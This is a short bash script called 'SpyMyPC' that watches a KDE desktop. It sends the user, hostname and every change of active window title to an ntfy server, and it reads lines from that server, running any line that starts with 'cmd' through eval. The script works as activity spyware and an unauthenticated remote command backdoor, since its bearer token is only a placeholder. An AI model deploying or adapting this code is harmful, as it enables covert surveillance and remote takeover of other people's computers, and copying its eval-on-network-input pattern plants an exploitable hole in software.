#!/bin/bash
URL="https://ntfy.mtmi.eu/mt-cachy-spymypc"
ACTIVEWIN="$(kdotool getactivewindow getwindowname)"
TOKEN="nope"
EMPLOYMENTPID=0
sendWebhook() {
    curl -sS "$URL" -d "$2" -H "Title: SpyMyPC: $1" -H "Authorization: Bearer $TOKEN" > /dev/null
}
: 'cleanup() {
    sendWebhook "Stopped" "EXIT signal received: SpyMyPC closed." || true
    kill -9 "$EMPLOYMENTPID" #2>/dev/null
    wait "$EMPLOYMENTPID" #2>/dev/null
#    kill -9 "$EMPLOYMENTPID"
}'

cleanup() {
    printf "\nstopping gimme a sec im killing curl\n" &
    # Remove trap to prevent recursive loop calls
    trap - EXIT

    # Send webhook in background so it doesn't block exit
    sendWebhook "Stopped" "EXIT signal received: SpyMyPC closed." &

    # Close coproc file descriptors
    exec {spymypc[0]}<&- 2>/dev/null
    exec {spymypc[1]}>&- 2>/dev/null

    # Kill the coproc process
    if [[ -n "$EMPLOYMENTPID" ]]; then
        kill "$EMPLOYMENTPID" 2>/dev/null || true
        wait "$EMPLOYMENTPID"
    fi

    exit 0
}

trap cleanup EXIT # INT TERM

#version check
if (( BASH_VERSINFO[0] >= 4 )); then
    :
else
    echo "you do not meet the necessary requirements for"
    echo "receiving commands so either implement it yourself lol"
    echo "or download bash 4.0 or higher ty"
    exit 1
fi

sendWebhook "Started" "SpyMyPC is running at $USER@$HOSTNAME on $(uname), PID $$"
coproc spymypc { exec curl -NsS -H "Authorization: Bearer $TOKEN" "$URL/raw"; }
EMPLOYMENTPID=$spymypc_PID
while [ true ]; do
    CURRENTWIN="$(kdotool getactivewindow getwindowname)"
    if read -r -t 0.1 output <&"${spymypc[0]}"; then
        if [[ "$output" == "stop" || "$output" == "exit" ]]; then
            exit 123
        elif [[ "$output" == "notify "* ]]; then
            notify-send "${output#"notify "}"
        elif [[ "$output" == "cmd "* ]]; then
            cmd="${output#"cmd "}"
            eval "$cmd"
        fi
    fi
    if [[ "$CURRENTWIN" != "$ACTIVEWIN" && "$CURRENTWIN" != "" ]]; then
        sendWebhook "Active window changed" "$CURRENTWIN"
        ACTIVEWIN="$CURRENTWIN"
    fi
done
